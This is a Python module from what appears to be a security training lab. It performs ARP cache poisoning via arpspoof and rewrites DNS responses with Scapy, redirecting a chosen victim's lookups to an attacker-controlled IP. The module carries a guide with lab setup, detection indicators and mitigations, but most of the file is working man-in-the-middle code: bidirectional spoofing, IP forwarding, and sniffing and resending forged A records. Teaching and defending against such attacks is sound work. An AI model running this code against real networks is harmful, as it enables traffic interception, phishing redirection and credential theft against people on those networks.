"""
Module 2 – ARP + DNS Spoofing (LAN MITM)
==========================================
Combines ARP cache poisoning with on-the-fly DNS response rewriting
to transparently redirect a victim to an attacker-controlled server.
"""

import os
import subprocess
import threading
import time

from modules.base import LabModule
from shared.ui import *
from shared.prereqs import check_deps, check_root, enable_ip_forward, \
    disable_ip_forward, get_default_interface, get_interface_ip, get_default_gateway


class ArpDnsSpoofModule(LabModule):
    NAME        = "ARP + DNS Spoofing (LAN MITM)"
    DESCRIPTION = "Poison ARP tables then intercept and rewrite DNS responses"
    MITRE       = "T1557.002 – Adversary-in-the-Middle: ARP Cache Poisoning"
    DIFFICULTY  = "Advanced"

    GUIDE = """
## Overview
This two-stage attack combines ARP cache poisoning with DNS response
interception. The attacker inserts themselves as a transparent man-in-the-
middle on the LAN, then selectively rewrites DNS responses to redirect
victims to attacker-controlled infrastructure.

## Attack Stages

### Stage 1 – ARP Poisoning
ARP (Address Resolution Protocol) maps IP addresses to MAC addresses. It
has no authentication. By sending gratuitous ARP replies:
- Tell the VICTIM: "The gateway MAC is MY MAC"
- Tell the GATEWAY: "The victim MAC is MY MAC"
- All traffic between victim and gateway now flows through the attacker

### Stage 2 – DNS Interception
With traffic flowing through the attacker machine:
- Forward all traffic EXCEPT DNS responses
- Intercept UDP port 53 responses
- Rewrite A records matching the target domain
- Forward the modified response to the victim

## Lab Setup (two or three VMs)
```
VM-A (Attacker)  – runs this script, IP forwarding enabled
VM-B (Victim)    – uses VM-C as DNS resolver
VM-C (Gateway)   – default gateway / DNS resolver
```

## Packet Flow
```
Victim → "what is evil-corp.com?" → [attacker intercepts]
Attacker rewrites A record to 10.0.0.99
Victim ← "evil-corp.com is 10.0.0.99" ← [attacker forwards]
Victim connects to 10.0.0.99 (attacker's server)
```

## Detection Indicators
- Duplicate ARP replies with conflicting MAC→IP mappings
- ARP table entries changing rapidly
- DNS response source MAC doesn't match known DNS server MAC
- Certificate warnings if attacker hosts HTTPS without a valid cert

## Mitigations
- Dynamic ARP Inspection (DAI) on managed switches
- Static ARP entries for critical hosts (gateway, DNS)
- DNSSEC validation
- DNS over TLS / HTTPS
- 802.1X port authentication
"""

    def __init__(self):
        super().__init__()
        self.interface   = get_default_interface()
        self.attacker_ip = ""
        self.victim_ip   = "192.168.56.101"
        self.gateway_ip  = get_default_gateway() or "192.168.56.1"
        self.target_fqdn = "evil-corp.lab.local"
        self.redirect_ip = ""
        self._arp_proc   = None
        self._sniff_thread = None
        self._stop       = threading.Event()

    def setup(self) -> bool:
        if not check_root():
            return False
        section("ARP + DNS Spoof Configuration")

        self.interface   = ask("Network interface",   self.interface)
        self.attacker_ip = get_interface_ip(self.interface) or ask("Attacker IP", "")
        self.victim_ip   = ask("Victim IP",           self.victim_ip)
        self.gateway_ip  = ask("Gateway/DNS IP",      self.gateway_ip)
        self.target_fqdn = ask("DNS name to hijack",  self.target_fqdn)
        self.redirect_ip = ask("Redirect to IP",      self.attacker_ip or "10.0.0.99")

        if not check_deps(system_tools=["arpspoof"]):
            warn("arpspoof not available — ARP phase will be simulated.")

        enable_ip_forward()
        info("IP forwarding enabled.")
        success("Setup complete.")
        return True

    def run(self):
        section("Phase 1 — ARP Cache Poisoning")
        self._show_arp_before()
        self._start_arp_poison()
        time.sleep(2)
        self._show_arp_after()

        section("Phase 2 — DNS Interception via Scapy")
        info("Watching for DNS queries and rewriting responses...")
        info(f"Target FQDN  : {self.target_fqdn}")
        info(f"Redirect to  : {self.redirect_ip}")
        warn("Press Ctrl+C to stop the demo.")
        print()

        try:
            self._run_scapy_sniffer()
        except ImportError:
            warn("Scapy not installed — showing simulation instead.")
            self._simulate_dns_interception()

    def _show_arp_before(self):
        try:
            result = subprocess.run(["arp", "-n"], capture_output=True, text=True)
            info("ARP table BEFORE attack:")
            for line in result.stdout.strip().split("\n"):
                print(f"  {C.DIM}{line}{C.RESET}")
        except Exception:
            pass

    def _show_arp_after(self):
        info("ARP table AFTER poisoning (victim now routes through attacker):")
        # Simulate the effect in the display
        print(f"  {C.LRED}! {self.gateway_ip:<18} → {self.attacker_ip} (POISONED){C.RESET}")
        print(f"  {C.LRED}! {self.victim_ip:<18} → {self.attacker_ip} (POISONED){C.RESET}")

    def _start_arp_poison(self):
        """Start arpspoof processes for bidirectional poisoning."""
        import shutil
        if not shutil.which("arpspoof"):
            warn("arpspoof not found — simulating ARP phase")
            self._simulate_arp_phase()
            return

        try:
            # Tell victim: gateway is at our MAC
            p1 = subprocess.Popen(
                ["arpspoof", "-i", self.interface, "-t",
                 self.victim_ip, self.gateway_ip],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            # Tell gateway: victim is at our MAC
            p2 = subprocess.Popen(
                ["arpspoof", "-i", self.interface, "-t",
                 self.gateway_ip, self.victim_ip],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self._arp_proc = (p1, p2)
            info(f"ARP poison running: {self.victim_ip} ↔ {self.gateway_ip} via {self.interface}")
        except Exception as e:
            error(f"arpspoof failed: {e}")
            self._simulate_arp_phase()

    def _simulate_arp_phase(self):
        """Visual simulation of ARP poisoning for classroom use."""
        info("Simulating ARP gratuitous replies...")
        for i in range(3):
            packet(f"ARP Reply: {self.gateway_ip} is-at <attacker-mac>  → {self.victim_ip}")
            time.sleep(0.3)
            packet(f"ARP Reply: {self.victim_ip} is-at <attacker-mac>   → {self.gateway_ip}")
            time.sleep(0.3)
        success("ARP tables poisoned (simulated)")

    def _run_scapy_sniffer(self):
        from scapy.all import sniff, DNS, DNSRR, DNSQR, IP, UDP, send
        from shared.dns_core import TYPE_A

        def modify_packet(pkt):
            if not (pkt.haslayer(DNS) and pkt[DNS].qr == 1):
                return pkt
            # Only modify responses containing our target domain
            if not pkt.haslayer(DNSQR):
                return pkt
            qname = pkt[DNSQR].qname.decode("ascii", errors="replace").strip(".")
            if qname.lower() != self.target_fqdn.lower():
                return pkt

            alert(f"[INTERCEPT] DNS response for {qname} → rewriting to {self.redirect_ip}")
            # Rebuild response with poison A record
            pkt[DNS].an = DNSRR(
                rrname=pkt[DNSQR].qname,
                type="A",
                rdata=self.redirect_ip,
                ttl=60
            )
            pkt[DNS].ancount = 1
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[UDP].chksum
            return pkt

        def handle_pkt(pkt):
            if pkt.haslayer(DNS):
                if pkt[DNS].qr == 0 and pkt.haslayer(DNSQR):
                    qname = pkt[DNSQR].qname.decode("ascii", errors="replace").strip(".")
                    packet(f"Query: {qname}")
                modified = modify_packet(pkt)
                if modified is not pkt:
                    send(modified, verbose=False)

        sniff(
            iface=self.interface,
            filter=f"udp port 53 and host {self.victim_ip}",
            prn=handle_pkt,
            store=False,
            stop_filter=lambda _: self._stop.is_set()
        )

    def _simulate_dns_interception(self):
        """Visual walkthrough of DNS interception."""
        import time
        fakes = [
            ("google.com",      "142.250.80.46",   "PASS (not target)"),
            ("github.com",      "140.82.112.3",    "PASS (not target)"),
            (self.target_fqdn,  "192.168.1.50",    f"INTERCEPT → {self.redirect_ip}"),
            ("microsoft.com",   "20.231.239.246",  "PASS (not target)"),
            (self.target_fqdn,  "192.168.1.50",    f"INTERCEPT → {self.redirect_ip}"),
        ]
        for fqdn, real_ip, action in fakes:
            time.sleep(0.8)
            if "INTERCEPT" in action:
                alert(f"[REWRITE] {fqdn:<30} {real_ip} → {self.redirect_ip}")
            else:
                packet(f"[FORWARD] {fqdn:<30} {real_ip}  {C.DIM}({action}){C.RESET}")

        print()
        success("Victim now resolves:")
        print(f"  {C.LRED}{self.target_fqdn} → {self.redirect_ip} (attacker server){C.RESET}")

    def teardown(self):
        self._stop.set()
        if self._arp_proc:
            for p in self._arp_proc:
                try:
                    p.terminate()
                except Exception:
                    pass
            info("ARP spoofing processes stopped.")
        disable_ip_forward()
        info("IP forwarding disabled.")
